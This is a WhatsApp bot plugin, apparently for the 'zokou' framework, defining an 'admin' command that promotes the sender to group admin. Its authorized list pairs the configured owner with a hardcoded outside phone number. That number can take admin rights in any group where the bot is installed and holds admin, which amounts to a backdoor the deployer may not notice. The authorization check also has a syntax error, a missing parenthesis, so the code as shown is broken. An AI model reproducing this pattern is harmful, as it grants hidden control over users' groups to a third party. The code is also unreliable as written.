const { zokou } = require('../framework/zokou');
const config = require('../config');

zokou({
    nomCom: "admin",
    categorie: "Owner",
    reaction: "👑",
    description: "Take adminship for authorized users",
    alias: ["takeadmin", "makeadmin"],
    filename: __filename
}, async (dest, zk, commandeOptions) => {
    const { auteurMessage, repondre, ms, auteurMsg, superUser, membreGroupe, infosGroupe } = commandeOptions;

    // Verify group context
    if (!membreGroupe) return repondre("❌ This command can only be used in groups.");

    // Verify bot is admin
    if (!infosGroupe?.isBotAdmin) return repondre("❌ I need to be an admin to perform this action.");

    // Normalize JIDs for comparison
    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    // Authorized users (properly formatted JIDs)
    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV), // Handles both raw numbers and JIDs in config
        "923427582273@s.whatsapp.net"
    ].filter(Boolean);

    // Check authorization with normalized JIDs
    const senderNormalized = normalizeJid(auteurMsg);
    if (!AUTHORIZED_USERS.includes(senderNormalized) {
        return repondre("❌ This command is restricted to authorized users only");
    }

    try {
        // Get current group metadata
        const groupMetadata = await zk.groupMetadata(dest);
        
        // Check if already admin
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (userParticipant?.admin) {
            return repondre("ℹ️ You're already an admin in this group");
        }

        // Promote self to admin
        await zk.groupParticipantsUpdate(dest, [senderNormalized], "promote");
        
        return repondre("✅ Successfully granted you admin rights!");
        
    } catch (error) {
        console.error("Admin command error:", error);
        return repondre("❌ Failed to grant admin rights. Error: " + error.message);
    }
});
